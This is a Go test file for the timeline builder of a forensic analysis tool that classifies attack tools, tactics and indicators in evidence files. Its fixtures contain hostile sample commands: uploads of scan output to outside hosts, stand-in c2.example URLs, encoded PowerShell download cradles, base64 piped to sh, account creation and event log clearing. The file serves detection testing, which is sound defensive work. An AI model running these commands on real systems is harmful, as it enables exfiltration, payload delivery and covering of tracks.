package trace

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"reflect"
	"slices"
	"sync"
	"testing"
	"unicode/utf16"

	"github.com/get-sybers/slopmop/internal/activity"
	"github.com/get-sybers/slopmop/internal/evidence"
	"github.com/get-sybers/slopmop/internal/evidencetest"
	"github.com/get-sybers/slopmop/internal/indicator"
	"github.com/get-sybers/slopmop/internal/intel"
	"github.com/get-sybers/slopmop/internal/inventory"
	"github.com/get-sybers/slopmop/internal/structured"
	"github.com/get-sybers/slopmop/internal/tactic"
)

func loadTables(t *testing.T) Tables {
	t.Helper()
	tac, err := tactic.LoadTactics()
	if err != nil {
		t.Fatal(err)
	}
	ind, err := indicator.LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	formats, err := structured.LoadFormats()
	if err != nil {
		t.Fatal(err)
	}
	acts, err := activity.LoadActivities()
	if err != nil {
		t.Fatal(err)
	}
	return Tables{Tactics: tac, Activities: acts, Patterns: ind, Formats: formats}
}

func TestBuildBash(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder, 0)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)
	tl := Build(res.Files, res.Texts, tables)
	if len(tl.Steps) == 0 {
		t.Fatal("no steps")
	}
	scripts := 0
	for _, s := range tl.Steps {
		if s.File.Role == evidence.Script {
			scripts++
			if s.Turn < 1 {
				t.Errorf("%s: turn %d, want >= 1", s.File.Path, s.Turn)
			}
		}
	}
	if scripts == 0 {
		t.Error("no scripts in timeline")
	}
}

func TestBuildHasToolsAndTactics(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder, 0)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)
	tl := Build(res.Files, res.Texts, tables)
	foundTools := false
	foundTactics := false
	for _, s := range tl.Steps {
		if len(s.Tools) > 0 {
			foundTools = true
		}
		if len(s.Tactics) > 0 {
			foundTactics = true
		}
	}
	if !foundTools {
		t.Error("no tools extracted from any script")
	}
	if !foundTactics {
		t.Error("no tactics classified for any script")
	}
}

func TestBuildHasIndicators(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder, 0)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)
	tl := Build(res.Files, res.Texts, tables)
	total := 0
	for _, s := range tl.Steps {
		total += s.Indicators
	}
	if total == 0 {
		t.Error("no indicators found in any file")
	}
}

func TestBuildEmpty(t *testing.T) {
	tables := loadTables(t)
	tl := Build(nil, nil, tables)
	if len(tl.Steps) != 0 {
		t.Errorf("steps = %d, want 0", len(tl.Steps))
	}
}

func TestSortByTime(t *testing.T) {
	a := evidence.File{Path: "b.sh"}
	b := evidence.File{Path: "a.sh"}
	sorted := sortByTime([]evidence.File{a, b})
	if sorted[0].Path != "a.sh" || sorted[1].Path != "b.sh" {
		t.Errorf("sorted = %v %v, want a.sh b.sh", sorted[0].Path, sorted[1].Path)
	}
}

func TestLinkOutputsByBaseName(t *testing.T) {
	files := []evidence.File{
		{Path: "run.sh", Role: evidence.Script},
		{Path: "run.ps1", Role: evidence.Script},
		{Path: "out.txt", Role: evidence.Output},
		{Path: "loot/dump.log", Role: evidence.Output},
		{Path: "unrelated.txt", Role: evidence.Output},
	}
	texts := map[string]string{
		"run.sh":  "id > ./out.txt\nid >> ./out.txt\n",
		"run.ps1": "whoami | Out-File -FilePath C:\\work\\dump.log\n",
	}
	tables := loadTables(t)
	got := map[string][]string{}
	for _, s := range Build(files, texts, tables).Steps {
		got[s.File.Path] = s.Outputs
	}
	if o := got["run.sh"]; len(o) != 1 || o[0] != "out.txt" {
		t.Errorf("run.sh outputs = %v, want [out.txt]", o)
	}
	if o := got["run.ps1"]; len(o) != 1 || o[0] != "loot/dump.log" {
		t.Errorf("run.ps1 outputs = %v, want [loot/dump.log]", o)
	}
}

func TestBuildPython(t *testing.T) {
	files := []evidence.File{
		{Path: "scan.py", Role: evidence.Script},
		{Path: "beacon", Role: evidence.Script},
		{Path: "scan.txt", Role: evidence.Output},
	}
	texts := map[string]string{
		"scan.py": "import subprocess, base64\n" +
			"OUT = \"scan.txt\"\n" +
			"subprocess.run([\"nmap\", \"-sV\", \"10.20.1.5\", \"-oN\", OUT])\n" +
			"blob = base64.b64encode(open(OUT, \"rb\").read())\n",
		"beacon": "#!/usr/bin/env python3\nimport requests\nrequests.post(\"http://10.20.1.9/up\", files={\"f\": open(\"scan.txt\", \"rb\")})\n",
	}
	tables := loadTables(t)
	steps := map[string]Step{}
	for _, s := range Build(files, texts, tables).Steps {
		steps[s.File.Path] = s
	}
	cases := []struct {
		path, tool, tactic string
	}{
		{"scan.py", "nmap", "Discovery"},
		{"scan.py", "subprocess.run", "Execution"},
		{"beacon", "requests.post", "Exfiltration"},
	}
	for _, c := range cases {
		s := steps[c.path]
		if !slices.Contains(s.Tools, c.tool) || !slices.Contains(s.Tactics, c.tactic) {
			t.Errorf("%s: tools %v tactics %v, want %s and %s", c.path, s.Tools, s.Tactics, c.tool, c.tactic)
		}
		if s.Indicators == 0 {
			t.Errorf("%s: no indicators", c.path)
		}
	}
	scan := steps["scan.py"]
	if !slices.Contains(scan.Transforms, "Base64Encode") {
		t.Errorf("scan.py transforms = %v, want Base64Encode", scan.Transforms)
	}
	if len(scan.Outputs) != 1 || scan.Outputs[0] != "scan.txt" {
		t.Errorf("scan.py outputs = %v, want [scan.txt]", scan.Outputs)
	}
}

func TestBuildWithWatchlist(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder, 0)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)

	// Build a watchlist with an IP that appears in the bash fixtures.
	wlData := []byte(`[{"value": "10.20.1.5", "attribution": "TEST-ACTOR"}]`)
	wl, err := intel.LoadWatchlist(wlData)
	if err != nil {
		t.Fatal(err)
	}
	tables.Watchlist = &wl
	tl := Build(res.Files, res.Texts, tables)
	totalHits := 0
	for _, s := range tl.Steps {
		totalHits += len(s.IntelHits)
	}
	if totalHits == 0 {
		t.Error("expected at least one intel hit against 10.20.1.5")
	}
}

func TestBuildStructuredReports(t *testing.T) {
	cases := []struct {
		name       string
		file       string
		text       string
		tools      []string
		transforms []string
		indicators int
		hit        string
	}{
		{
			name:       "json",
			file:       "report.json",
			text:       `{"steps": [{"command": "nmap -sV 10.0.0.5", "url": "http:\/\/c2.example\/drop"}]}`,
			tools:      []string{"nmap"},
			indicators: 3,
			hit:        "http://c2.example/drop",
		},
		{
			name:       "json with an encoded powershell command",
			file:       "events.jsonl",
			text:       `{"ProcessCommandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="}` + "\n",
			tools:      []string{"powershell.exe", "new-object", "iex"},
			transforms: []string{"EncodedCommand"},
			indicators: 1,
		},
		{
			name:       "xml",
			file:       "export.xml",
			text:       `<run><command>curl -s -o drop "http://c2.example/drop?a=1&amp;b=2"</command></run>`,
			tools:      []string{"curl"},
			indicators: 2,
			hit:        "http://c2.example/drop?a=1&b=2",
		},
		{
			name:       "html",
			file:       "summary.html",
			text:       `<p>Fetched <a href="http://c2.example/drop">the payload</a></p><code>whoami</code>`,
			tools:      []string{"whoami"},
			indicators: 2,
			hit:        "http://c2.example/drop",
		},
		{
			name:       "malformed json is read as plain text",
			file:       "broken.json",
			text:       `{"command": "nmap 10.0.0.5", `,
			indicators: 1,
		},
		{
			name:       "plain text records no command",
			file:       "notes.txt",
			text:       `{"command": "nmap 10.0.0.5"}`,
			indicators: 1,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			tables := loadTables(t)
			if c.hit != "" {
				wl, err := intel.LoadWatchlist([]byte(`[{"value": "` + c.hit + `", "attribution": "TEST-ACTOR"}]`))
				if err != nil {
					t.Fatal(err)
				}
				tables.Watchlist = &wl
			}
			files := []evidence.File{{Path: c.file, Role: evidence.Output}}
			steps := Build(files, map[string]string{c.file: c.text}, tables).Steps
			if len(steps) != 1 {
				t.Fatalf("%d steps, want 1", len(steps))
			}
			s := steps[0]
			if !slices.Equal(s.Tools, c.tools) {
				t.Errorf("tools = %q, want %q", s.Tools, c.tools)
			}
			if !slices.Equal(s.Transforms, c.transforms) {
				t.Errorf("transforms = %q, want %q", s.Transforms, c.transforms)
			}
			if s.Indicators != c.indicators {
				t.Errorf("indicators = %d, want %d", s.Indicators, c.indicators)
			}
			if s.Turn != 0 || len(s.Outputs) != 0 {
				t.Errorf("turn %d outputs %q, want 0 and none", s.Turn, s.Outputs)
			}
			if c.hit != "" && (len(s.IntelHits) != 1 || s.IntelHits[0].Value != c.hit) {
				t.Errorf("intel hits = %+v, want one on %q", s.IntelHits, c.hit)
			}
			if c.tools != nil && len(s.Tactics) == 0 {
				t.Errorf("no tactic for %q", s.Tools)
			}
		})
	}
}

func TestBuildActivities(t *testing.T) {
	files := []evidence.File{
		{Path: "grant.ps1", Role: evidence.Script},
		{Path: "agent.jsonl", Role: evidence.Output},
		{Path: "notes.txt", Role: evidence.Output},
	}
	texts := map[string]string{
		"grant.ps1":   "Invoke-RestMethod -Method Post -Uri \"$graph/applications/$app/addPassword\"\nAdd-MgApplicationPassword -ApplicationId $app\n",
		"agent.jsonl": `{"request":"GET https://corpvault.vault.azure.net/secrets?api-version=7.4"}` + "\n",
		"notes.txt":   "nothing of note\n",
	}
	steps := map[string]Step{}
	for _, s := range Build(files, texts, loadTables(t)).Steps {
		steps[s.File.Path] = s
	}
	script := steps["grant.ps1"]
	if len(script.Activities) != 1 || script.Activities[0].Name != "AppCredentialAddition" || script.Activities[0].Lines != 2 {
		t.Errorf("grant.ps1 activities = %+v, want AppCredentialAddition on 2 lines", script.Activities)
	}
	// The cmdlet and the activity both say Persistence; it is listed once.
	if got, want := script.Tactics, []string{"Persistence"}; !slices.Equal(got, want) {
		t.Errorf("grant.ps1 tactics = %q, want %q", got, want)
	}
	log := steps["agent.jsonl"]
	if len(log.Activities) != 1 || log.Activities[0].Name != "KeyVaultSecretRead" {
		t.Errorf("agent.jsonl activities = %+v, want KeyVaultSecretRead", log.Activities)
	}
	if got, want := log.Tactics, []string{"CredentialAccess"}; !slices.Equal(got, want) {
		t.Errorf("agent.jsonl tactics = %q, want %q", got, want)
	}
	if plain := steps["notes.txt"]; len(plain.Activities) != 0 || len(plain.Tactics) != 0 {
		t.Errorf("notes.txt = %+v, want no activity and no tactic", plain)
	}
}

// encodeCommand encodes a script as PowerShell's -EncodedCommand takes it.
func encodeCommand(script string) string {
	units := utf16.Encode([]rune(script))
	raw := make([]byte, 0, 2*len(units))
	for _, u := range units {
		raw = binary.LittleEndian.AppendUint16(raw, u)
	}
	return base64.StdEncoding.EncodeToString(raw)
}

func TestBuildReadsEncodedPayloads(t *testing.T) {
	inner := "whoami /all; (New-Object Net.WebClient).DownloadFile('http://198.51.100.7/a.bin', 'a.bin')"
	outer := "powershell.exe -nop -enc " + encodeCommand(inner)
	wrapped := "cmd /c powershell -enc " + encodeCommand(outer)
	files := []evidence.File{
		{Path: "stage.ps1", Role: evidence.Script},
		{Path: "run.cmd", Role: evidence.Output},
		{Path: "plain.ps1", Role: evidence.Script},
	}
	texts := map[string]string{
		"stage.ps1": outer + "\n",
		"run.cmd":   wrapped + "\r\n",
		"plain.ps1": "Get-Date\n",
	}
	steps := map[string]Step{}
	for _, s := range Build(files, texts, loadTables(t)).Steps {
		steps[s.File.Path] = s
	}
	for _, path := range []string{"stage.ps1", "run.cmd"} {
		s := steps[path]
		if !slices.Contains(s.Tools, "whoami") || !slices.Contains(s.Tools, "new-object") {
			t.Errorf("%s tools = %q, want those of the payload", path, s.Tools)
		}
		if len(s.Activities) != 1 || s.Activities[0].Name != "FileDownload" {
			t.Errorf("%s activities = %+v, want FileDownload from the payload", path, s.Activities)
		}
		found := false
		for _, m := range s.Matches {
			found = found || m.Value == "198.51.100.7"
		}
		if !found {
			t.Errorf("%s indicators = %+v, want the address in the payload", path, s.Matches)
		}
		if !slices.Contains(s.Tactics, "CommandAndControl") || !slices.Contains(s.Tactics, "Discovery") {
			t.Errorf("%s tactics = %q, want those of the payload", path, s.Tactics)
		}
	}
	if s := steps["run.cmd"]; !slices.Contains(s.Tools, "cmd") || !slices.Contains(s.Tools, "powershell") {
		t.Errorf("run.cmd tools = %q, want the batch commands too", s.Tools)
	}
	if s := steps["plain.ps1"]; len(s.Activities) != 0 || !slices.Equal(s.Tools, []string{"get-date"}) {
		t.Errorf("plain.ps1 = %+v, want it untouched", s)
	}
}

// The commands an audit log and a trace of system calls record are read as
// those of a script are. A script that quotes a record ran none of them.
func TestBuildReadsRecordedCommands(t *testing.T) {
	audit := `type=EXECVE msg=audit(1677650400.123:4567): argc=3 a0="chage" a1="-l" a2="root"` + "\n" +
		`type=EXECVE msg=audit(1677650401.200:4568): argc=3 a0="grep" a1="PASS_MAX_DAYS" a2="/etc/login.defs"` + "\n" +
		`type=PROCTITLE msg=audit(1677650402.300:4569): proctitle=` + hex.EncodeToString([]byte("cat\x00/etc/passwd")) + "\n"
	traced := `execve("/usr/bin/nmap", ["nmap", "-sV", "10.0.0.5"], 0x7ffd5c3e1b40 /* 9 vars */) = 0` + "\n"
	files := []evidence.File{
		{Path: "audit.log", Role: evidence.Output},
		{Path: "strace.txt", Role: evidence.Output},
		{Path: "notes.sh", Role: evidence.Script},
	}
	texts := map[string]string{"audit.log": audit, "strace.txt": traced, "notes.sh": "# " + audit}
	steps := map[string]Step{}
	for _, s := range Build(files, texts, loadTables(t)).Steps {
		steps[s.File.Path] = s
	}
	held := func(s Step) []string {
		var names []string
		for _, a := range s.Activities {
			names = append(names, a.Name)
		}
		return names
	}
	log := steps["audit.log"]
	for _, tool := range []string{"chage", "grep", "cat"} {
		if !slices.Contains(log.Tools, tool) {
			t.Errorf("audit.log tools = %q, want %s", log.Tools, tool)
		}
	}
	for _, name := range []string{"PasswordPolicyDiscovery", "AccountEnumeration", "LocalAccountEnumeration"} {
		if !slices.Contains(held(log), name) {
			t.Errorf("audit.log activities = %q, want %s", held(log), name)
		}
	}
	if s := steps["strace.txt"]; !slices.Contains(s.Tools, "nmap") || !slices.Contains(s.Tactics, "Discovery") {
		t.Errorf("strace.txt = tools %q of %q, want nmap of Discovery", s.Tools, s.Tactics)
	}
	if s := steps["notes.sh"]; len(s.Activities) != 0 || len(s.Tools) != 0 {
		t.Errorf("notes.sh = tools %q and %q, want a quoted record to count for nothing", s.Tools, held(s))
	}
}

func TestBuildBatchScript(t *testing.T) {
	files := []evidence.File{{Path: "clean.bat", Role: evidence.Script}, {Path: "who.txt", Role: evidence.Output}}
	texts := map[string]string{"clean.bat": "@echo off\r\nwhoami > who.txt\r\nwevtutil cl System\r\n", "who.txt": "corp\\u\n"}
	steps := Build(files, texts, loadTables(t)).Steps
	s := steps[0]
	if s.File.Path != "clean.bat" || s.Turn != 1 || !slices.Equal(s.Tools, []string{"whoami", "wevtutil"}) {
		t.Errorf("clean.bat = turn %d tools %q, want turn 1 with whoami and wevtutil", s.Turn, s.Tools)
	}
	if !slices.Equal(s.Outputs, []string{"who.txt"}) {
		t.Errorf("clean.bat outputs = %q, want who.txt", s.Outputs)
	}
	if len(s.Activities) != 1 || s.Activities[0].Name != "EventLogClearing" {
		t.Errorf("clean.bat activities = %+v, want EventLogClearing", s.Activities)
	}
}

// A line number is kept where it is a line of the file: not in a decoded
// report, and not in a payload that was decoded out of the file.
func TestBuildNumbersLines(t *testing.T) {
	payload := base64.StdEncoding.EncodeToString([]byte("useradd -m helper; curl -T out.tgz https://files.example.net/up"))
	files := []evidence.File{
		{Path: "a.sh", Role: evidence.Script},
		{Path: "log.jsonl", Role: evidence.Output},
		{Path: "notes.txt", Role: evidence.Output},
	}
	texts := map[string]string{
		"a.sh":      "#!/bin/bash\n\nuseradd -m svc\nssh ops@198.51.100.7 id\necho " + payload + " | base64 -d | sh\n",
		"log.jsonl": `{"cmdline":"useradd -m other"}` + "\n",
		"notes.txt": "first\nseen 192.0.2.9 and 192.0.2.10\nagain 192.0.2.9\n",
	}
	steps := map[string]Step{}
	for _, s := range Build(files, texts, loadTables(t)).Steps {
		steps[s.File.Path] = s
	}
	lines := map[string][]int{}
	for _, h := range steps["a.sh"].Activities {
		for _, e := range h.Evidence {
			lines[h.Name] = append(lines[h.Name], e.Line)
		}
	}
	if got := lines["AccountCreation"]; !slices.Equal(got, []int{3, 0}) {
		t.Errorf("AccountCreation lines = %v, want line 3 of the file and 0 for the decoded payload", got)
	}
	if got := lines["FileUpload"]; !slices.Equal(got, []int{0}) {
		t.Errorf("FileUpload lines = %v, want 0: it is only in the payload", got)
	}
	if got := steps["log.jsonl"].Activities; len(got) != 1 || got[0].Evidence[0].Line != 0 || got[0].Evidence[0].Text != "useradd -m other" {
		t.Errorf("a decoded report: %+v, want the command without a line", got)
	}
	// A command continued over lines ends on a line of the file, or has none.
	continued := map[string]string{
		"a.sh":      "#!/bin/bash\ncurl -s \\\n  -T out.tgz \\\n  https://files.example.net/up\n",
		"log.jsonl": `{"cmdline":"curl -s \\\n -T out.tgz https://files.example.net/up"}` + "\n",
	}
	for _, s := range Build(files[:2], continued, loadTables(t)).Steps {
		want := map[string][2]int{"a.sh": {2, 4}, "log.jsonl": {0, 0}}[s.File.Path]
		if len(s.Activities) != 1 || len(s.Activities[0].Evidence) != 1 {
			t.Fatalf("%s: activities = %+v, want one upload on one line", s.File.Path, s.Activities)
		}
		if e := s.Activities[0].Evidence[0]; e.Line != want[0] || e.Last != want[1] {
			t.Errorf("%s: the upload stands on lines %d to %d, want %d to %d", s.File.Path, e.Line, e.Last, want[0], want[1])
		}
	}
	found := map[string]int{}
	for _, m := range steps["notes.txt"].Matches {
		found[m.Value] = m.Line
	}
	if found["192.0.2.9"] != 2 || found["192.0.2.10"] != 2 {
		t.Errorf("indicator lines = %v, want both on line 2, where each is first seen", found)
	}
	for _, m := range steps["log.jsonl"].Matches {
		if m.Line != 0 {
			t.Errorf("an indicator of a decoded report has line %d", m.Line)
		}
	}
	var tools []string
	for _, c := range steps["a.sh"].Commands {
		tools = append(tools, c.Tool)
		if c.Tool == "ssh" && (c.Line != 4 || c.Text != "ssh ops@198.51.100.7 id") {
			t.Errorf("the ssh command = %+v, want line 4 and its text", c)
		}
	}
	if !slices.Contains(tools, "useradd") || !slices.Contains(tools, "ssh") || len(tools) != len(slices.Compact(slices.Sorted(slices.Values(tools)))) {
		t.Errorf("commands = %q, want each tool once", tools)
	}
	for _, c := range steps["log.jsonl"].Commands {
		if c.Line != 0 {
			t.Errorf("a command of a decoded report has line %d", c.Line)
		}
	}
}

// BuildWatched tells of each file as many times as Passes says, calls what
// it is handed back each time, and builds what Build builds.
func TestBuildWatchedTellsOfEveryPass(t *testing.T) {
	res, err := inventory.ReadAll(evidencetest.Copy(t, "linux"), 0)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)
	var mu sync.Mutex
	begun, done := map[string]int{}, 0
	watched := BuildWatched(res.Files, res.Texts, tables, func(path string) func() {
		mu.Lock()
		defer mu.Unlock()
		begun[path]++
		return func() {
			mu.Lock()
			defer mu.Unlock()
			done++
		}
	})
	total := 0
	for _, f := range res.Files {
		want := 2
		if f.Role == evidence.Script {
			want = 3
		}
		if begun[f.Path] != want {
			t.Errorf("%s is told of %d times, want %d", f.Path, begun[f.Path], want)
		}
		total += want
	}
	if got := Passes(res.Files); got != total || done != total {
		t.Errorf("Passes = %d and %d passes were done, want %d of each", got, done, total)
	}
	if !reflect.DeepEqual(watched, Build(res.Files, res.Texts, tables)) {
		t.Error("the timeline differs from the one Build gives")
	}
}
